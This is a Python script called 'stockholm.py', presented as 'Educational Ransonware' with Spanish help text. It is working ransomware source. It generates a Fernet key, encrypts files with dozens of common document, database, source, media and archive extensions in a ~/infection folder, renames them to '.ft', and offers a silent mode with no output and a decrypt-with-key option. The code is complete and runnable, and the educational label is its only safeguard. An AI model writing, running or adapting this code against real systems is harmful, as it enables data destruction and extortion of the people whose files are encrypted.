import sys
import os
from cryptography.fernet import Fernet
from colorama import Fore

recuerde = """Recuerde que los parametros a usar son:
		-help o -h para ver la ayuda.
		-version o -v para ver la version.
		-reverse o -r mas la key para desencriptar.
		-silence o -s para ejecutar ransonware en modo silencio (esto no mostara ningun output). """
version = """ Educational Ransonware
		Actualmente en la version 1.5
		Solo para uso educativo. """
help_msm = """
Usage: python3 stockholm.py [arguments]			Encripta los archivos, mostrando cuales fueron encriptados
   or: python3 stockholm.py [-r or -reverse] [key ...]	Desencripta los archivos, mostrando cuales fueron desencriptados
   or: python3 stockholm.py [arguments]			Para ejecutar otras opciones del programa

Arguments:
   -v or -version	Ver la version actual del programa
   -h or -help		Para mostar la ayuda
   -s or -silence	Encriptar sin mostrar output en la terminal """

ext_a_encriptar = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
'.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'
,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'
,'.myi','.ibd','.mdf','.ldf','.sln','.suo','.cs','.c','.cpp','.pas','.h','.asm','.js','.cmd','.bat','.ps1','.vbs'
,'.vb','.pl','.dip','.dch','.sch','.brd','.jsp','.php','.asp','.rb','.java','.jar','.class','.sh','.mp3','.wav'
,'.swf','.fla','.wmv','.mpg','.vob','.mpeg','.asf','.avi','.mov','.mp4','.3gp','.mkv','.3g2','.flv','.wma','.mid'
,'.m3u','.m4u','.djvu','.svg','.ai','.psd','.nef','.tiff','.tif','.cgm','.raw','.gif','.png','.bmp','.jpg','.jpeg'
,'.vcd','.iso','.backup','.zip','.rar','.7z','.gz','.tgz','.tar','.bak','.tbk','.bz2','.PAQ','.ARC','.aes','.gpg'
,'.vmx','.vmdk','.vdi','.sldm','.sldx','.sti','.sxi','.602','.hwp','.snt','.onetoc2','.dwg','.pdf','.wk1','.wks'
,'.123','.rtf','.csv','.txt','.vsdx','.vsd','.edb','.eml','.msg','.ost','.pst','.potm','.potx','.ppam','.ppsx'
,'.ppsm','.pps','.pot','.pptm','.pptx','.ppt','.xltm','.xltx','.xlc','.xlm','.xlt','.xlw','.xlsb','.xlsm'
,'.xlsx','.xls','.dotx','.dotm','.dot','.docm','.docb','.docx','.doc']
dir_path = os.environ['HOME']
car_path = dir_path + '/infection'

banner = """
             ,d                             88         88                        88
             88                             88         88                        88
             88                             88         88                        88
,adPPYba,  MM88MMM  ,adPPYba,    ,adPPYba,  88   ,d8   88,dPPYba,    ,adPPYba,   88  88,dPYba,,adPYba,
I8[    ""    88    a8"     "8a  a8"     ""  88 ,a8"    88P'    "8a  a8"     "8a  88  88P'   "88"    "8a
 `"Y8ba,     88    8b       d8  8b          8888[      88       88  8b       d8  88  88      88      88
aa    ]8I    88,   "8a,   ,a8"  "8a,   ,aa  88`"Yba,   88       88  "8a,   ,a8"  88  88      88      88
`"YbbdP"'    "Y888  `"YbbdP"'    `"Ybbd8"'  88   `Y8a  88       88   `"YbbdP"'   88  88      88      88
											     by scartage
                                                                                                         """

def main(dir_key):
	len_parametros = len(sys.argv)
	if len_parametros == 1:
		print(Fore.LIGHTBLUE_EX+banner)
		Files = get_files(True, False)
		our_key = get_key(True, dir_key)
		encrypt(False, Files, our_key)
	elif len_parametros == 2:
		parametro = str(sys.argv[1])
		if parametro == "-silence" or parametro == "-s" and len_parametros == 2:
			Files = get_files(True, True)
			our_key = get_key(True, dir_key)
			encrypt(True, Files, our_key)
		elif parametro == "-version" or parametro == "-v" and len_parametros == 2:
			print(Fore.LIGHTBLUE_EX+banner)
			print(Fore.YELLOW+version)
			quit()
		elif parametro == "-help" or parametro == "-h" and len_parametros == 2:
			print(Fore.LIGHTBLUE_EX+banner)
			print(Fore.YELLOW+help_msm)
			quit()
		else:
			secret_key = get_key(False, dir_key)
			menu_parametros(parametro, secret_key, 2)
	elif len_parametros == 3:
		parametro = str(sys.argv[1])
		key_for_decrypt = sys.argv[2]
		menu_parametros(parametro, key_for_decrypt, 3)
	elif len_parametros > 3:
		print(Fore.YELLOW+"Se han recibido mas parametros de los esperados")
		print(recuerde)


def menu_parametros(parametro, key, len_p):
	if (parametro == "-reverse" or parametro == "-r") and len_p == 3:
		print(Fore.LIGHTBLUE_EX+banner)
		crypted_files = get_files(False, True)	#??
		decrypt(crypted_files, key)
	elif parametro == "-jack" or parametro == "-j" and len_p == 2:
		print(Fore.LIGHTBLUE_EX+banner)
		crypted_files = get_files(False, True)	#??
		decrypt(crypted_files, key)
	else:
		print(Fore.YELLOW+"Parametro incorrecto o no reconocido,: ", recuerde)


def mostrar(Files, mode):
	if mode:
		for this_file in Files:
			print(Fore.GREEN+"-"+ this_file)
		print(Fore.RESET)
	else:
		for this_file in Files:
			print(Fore.RED+"-"+this_file)
		print(Fore.RESET)

def  get_files(mode, silence):
	Files = []
	Files_not_encripted = []
	files_crypted = []
	if mode:
		for this_file in os.listdir():
			if this_file == ".ransonware.py.swp" or this_file == "thekey.key" or this_file == "ransonware.py":
				continue
			name_file, ext_file = os.path.splitext(this_file)
			if os.path.isfile(this_file) and ext_file in ext_a_encriptar:
				Files.append(this_file)
			else:
				Files_not_encripted.append(this_file)
		if silence == False:
			if len(Files_not_encripted) != 0:
				print(Fore.YELLOW+"los siguientes archivos/carpetas se han salvado, por ahora...",)
				mostrar(Files_not_encripted, False)
				print(Fore.YELLOW+"Warning: si desea encriptar archivos de subcarpetas pongalos en la carpeta principal\n")
		return (Files)
	elif mode == False:
		for this_file in os.listdir():
			name_file, ext_file = os.path.splitext(this_file)
			if os.path.isfile(this_file) and ext_file == ".ft":
				files_crypted.append(this_file)
		return (files_crypted)

def get_key(make, dir_key):
	if make:
		our_key = Fernet.generate_key()
		with open (dir_key, "wb") as thekey:
			thekey.write(our_key)
			return (our_key)
	else:
		with open(dir_key, "rb") as thekey:
			secret_key = thekey.read()
			return (secret_key)

def encrypt(silence, Files, our_key):
	encrypted_files = []
	new_ext = ".ft"
	for this_file in Files:
		try:
			with open(this_file, "rb") as the_file:
				contents = the_file.read()
			content_encrypted = Fernet(our_key).encrypt(contents)
			with open(this_file, "wb") as the_file:
				the_file.write(content_encrypted)
			name_file, ext_file = os.path.splitext(this_file)
			if not ext_file == ".ft":
				new_name = '{}{}{}'.format(name_file, ext_file, new_ext)
				os.rename(this_file, new_name)
			encrypted_files.append(new_name)
		except:
			if silence == False:
				print(Fore.RED+"El siguiente archivo no se pudo encriptar revise si tiene los permisos necesarios: ", this_file)
	if silence == False:
		print(Fore.GREEN+"Estos archivos fueron encriptados: ")
		mostrar(encrypted_files, True)
		print(Fore.GREEN+"La key para desencriptar es: ", our_key)


def decrypt(files, secret_key):
	files_decrypted = []
	isit = 1
	for this_file in files:
		name_file, ext_file = os.path.splitext(this_file)
		real_name, real_ext = os.path.splitext(name_file)
		if os.path.isfile(this_file) and real_ext in ext_a_encriptar:
			if os.path.isfile(this_file) and ext_file == ".ft":
				isit = decrypting(this_file, secret_key)
				if isit == 0:
					break
				else:
					back_file_name = '{}'.format(name_file)
					os.rename(this_file, back_file_name)
					files_decrypted.append(back_file_name)
	if isit != 0:
		print(Fore.GREEN+"Se han desencriptado los siguientes archivos: ")
		mostrar(files_decrypted, True)
	else:
		print(Fore.RED+"Incorrect key, stop playing")

def decrypting(this_file, secret_key):
	try:
		with open(this_file, "rb") as the_file:
			contents = the_file.read()
		contents_decrypted = Fernet(secret_key).decrypt(contents)
		with open(this_file, "wb") as the_file:
			the_file.write(contents_decrypted)
	except:
		return (0)


if __name__ == '__main__':
	dir_key =  os.getcwd() + "/thekey.key"
	if os.getcwd() != os.path.expanduser(dir_path):
		os.chdir(os.path.expanduser(dir_path))
		if os.path.exists(car_path):
			os.chdir(os.path.expanduser(car_path))
			main(dir_key)
		else:
			print(Fore.YELLOW+"Error:  directorio /infection no encontrado")
			quit()

